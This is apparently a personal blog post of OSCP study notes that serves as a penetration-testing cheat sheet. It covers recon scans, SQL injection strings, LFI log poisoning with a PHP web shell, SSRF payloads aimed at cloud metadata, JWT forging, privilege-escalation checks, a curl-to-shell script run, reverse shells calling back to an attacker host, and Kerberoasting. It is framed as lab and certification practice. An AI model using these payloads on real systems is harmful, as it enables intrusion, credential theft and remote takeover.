---
title:  "Hacking my notes on my way to OSCP!"
subtitle: "Hacker Dumps!"
author: "Geeky Blinder"
avatar: "img/authors/geeky.jpg"
image: "img/cards/hacking-my-notes-on-my-way-to-oscp.jpg"
date: 2024-01-16
tags: oscp hacking hacker
---

## Living Notes on the Way to OSCP

This is a running dump — the muscle-memory commands, the quick-reference patterns, and the "I've forgotten how to do X for the third time" cheats I keep coming back to while training for OSCP and adjacent labs. Less essay, more lab notebook. I'll keep adding as I learn.

For the longer-form companion thinking, see [The Race to OSCP](https://geekyblinder.co.uk/#/2024/01/16/hacking_to_oscp). For where to actually practise this stuff safely, [Building a Home Lab to Learn Hacking Without Going to Jail](https://geekyblinder.co.uk/#/2026/07/19/Building-a-Home-Lab-to-Learn-Hacking-Without-Going-to-Jail). For the writeup discipline, [How To Write a CTF Writeup That's Actually Worth Reading](https://geekyblinder.co.uk/#/2026/02/01/How-To-Write-a-CTF-Writeup).

---

## Recon: The First Twenty Minutes

The full TCP and UDP sweep that catches what most people miss:

```bash
# fast TCP across all ports
sudo nmap -p- --min-rate 5000 -T4 -oN nmap-fast.txt $TARGET

# extract open ports for the targeted service scan
PORTS=$(grep ^[0-9] nmap-fast.txt | cut -d/ -f1 | tr '\n' , | sed 's/,$//')

# version + default scripts on what's actually open
sudo nmap -sCV -p$PORTS -oN nmap-services.txt $TARGET

# top UDP ports — slow, run it in another tmux pane
sudo nmap -sU --top-ports 200 -oN nmap-udp.txt $TARGET
```

Web fuzzing baseline:

```bash
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,403
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.zip
ffuf -H "Host: FUZZ.$TARGET" -u http://$TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 404
```

SMB/RPC enumeration on Windows-flavoured boxes:

```bash
crackmapexec smb $TARGET --shares
enum4linux-ng -A $TARGET
nxc smb $TARGET -u '' -p '' --users
```

---

## Web App Bug Patterns I Always Forget

**SQL injection — the manual sanity check before sqlmap:**

```
'                       → server error / different response = candidate
' OR '1'='1            → true-condition test
' UNION SELECT NULL --  → adjust NULL count until no error
```

Then `sqlmap -u "$URL" --batch --risk=2 --level=3` only after you've confirmed the candidate manually. Lab only.

**Local file inclusion to RCE (the log-poisoning route):**

```
?file=../../../../var/log/apache2/access.log

# poison the log:
curl http://target/ -A "<?php system(\$_GET['c']); ?>"

# trigger:
?file=../../../../var/log/apache2/access.log&c=id
```

**SSRF starter payloads to test:**

```
http://127.0.0.1:80/
http://localhost:8080/
http://169.254.169.254/latest/meta-data/        # AWS IMDSv1
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO                   # Redis if reachable
```

**JWT mischief** (the full pattern in [Auth, OAuth, and JWTs: How They Work and How Attackers Break Them](https://geekyblinder.co.uk/#/2026/06/07/Auth-OAuth-and-JWTs-How-They-Work-and-How-Attackers-Break-Th)):

```bash
# alg:none forge
python3 -c "import jwt; print(jwt.encode({'sub':'admin','role':'admin'}, '', algorithm='none'))"

# brute weak HMAC
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

---

## Linux Privesc One-Liners

The boring-but-essential checks, in order:

```bash
# kernel + distro version (then check exploit-db)
uname -a && cat /etc/os-release

# sudo without a password?
sudo -l

# SUID binaries that aren't standard (cross-reference GTFOBins)
find / -perm -4000 -type f 2>/dev/null | grep -vE '^/(usr|bin|sbin)/(s?bin/)?(passwd|chsh|chfn|gpasswd|newgrp|mount|umount|su|sudo|pkexec|fusermount)$'

# writable cron jobs / paths
ls -la /etc/cron* /var/spool/cron/ 2>/dev/null
find / -writable -type f \( -path /proc -prune \) -prune -o -print 2>/dev/null | grep -E 'cron|init|systemd'

# capabilities the kernel might give you (cap_setuid is a winner)
getcap -r / 2>/dev/null

# all-in-one
curl -s https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh | sh
```

Always read [GTFOBins](https://gtfobins.github.io/) for any unusual binary you find SUID. Half the boxes are won there.

---

## Windows Privesc One-Liners

```powershell
# basic enumeration
whoami /priv
whoami /groups
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# unquoted service paths
wmic service get name,displayname,pathname,startmode |
  findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# AlwaysInstallElevated check (rare but devastating when set)
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# heavy lifting
.\winPEAS.exe
```

For AD-joined boxes, the BloodHound + Impacket workflow lives in the [Home Lab post](https://geekyblinder.co.uk/#/2026/07/19/Building-a-Home-Lab-to-Learn-Hacking-Without-Going-to-Jail).

---

## Reverse Shells That Actually Work

The cheat I always forget which flag goes where:

```bash
# Linux bash
bash -c 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1'

# Linux Python (when bash is broken)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("'$ATTACKER'",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# Windows PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('$ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$x=(iex $d 2>&1|Out-String);$x2=$x+'PS '+(pwd).Path+'> ';$s.Write([Text.Encoding]::ASCII.GetBytes($x2),0,$x2.Length);$s.Flush()};$c.Close()"
```

Upgrade a dumb shell to a proper TTY (the post-RCE classic):

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z to background
stty raw -echo; fg
export TERM=xterm
# resize the term to match your local
stty rows 50 cols 200
```

---

## Kerberoasting Quick Reference

```bash
# from a domain-joined attacker box
GetUserSPNs.py -dc-ip $DC -request -outputfile spns.txt 'DOMAIN.LOCAL/user:password'

# crack the TGS
hashcat -a 0 -m 13100 spns.txt /usr/share/wordlists/rockyou.txt
```

AS-REP roasting (for users with `DONT_REQ_PREAUTH`):

```bash
GetNPUsers.py -dc-ip $DC -no-pass -usersfile users.txt 'DOMAIN.LOCAL/'
hashcat -a 0 -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Reference Links I Keep Coming Back To

- **Cheatsheets** — [HackTricks](https://book.hacktricks.wiki/), [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), [HighOn.Coffee](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/), [GTFOBins](https://gtfobins.github.io/), [LOLBAS](https://lolbas-project.github.io/).
- **Wordlists** — [SecLists](https://github.com/danielmiessler/SecLists). Already in `/usr/share/seclists/` on Kali.
- **Local privesc enumeration** — [PEASS-ng](https://github.com/peass-ng/PEASS-ng) (linPEAS / winPEAS).
- **AD attacks** — [Impacket](https://github.com/fortra/impacket), [BloodHound](https://github.com/SpecterOps/BloodHound).
- **Web** — [PortSwigger Web Security Academy](https://portswigger.net/web-security) — the best free training in the field, full stop.
- **Practice platforms** — TryHackMe SOC L1 + Jr Pen Tester, HTB Academy, OffSec Proving Grounds, PortSwigger Academy.

---

## Final Thought

OSCP — and any hands-on cert — rewards reps and methodology, not memorisation. Every box runs the same general loop: enumerate exhaustively, identify candidates, exploit one, get a foothold, enumerate again, escalate. The commands above are the muscle-memory bits; the methodology and the writeup discipline (see [How To Write a CTF Writeup](https://geekyblinder.co.uk/#/2026/02/01/How-To-Write-a-CTF-Writeup)) are what turn reps into skill.

These notes get updated as I find better one-liners. If you spot something out of date or have a better way to do any of the above, let me know.

<img src="img/authors/geeky.jpg" width="40"/>
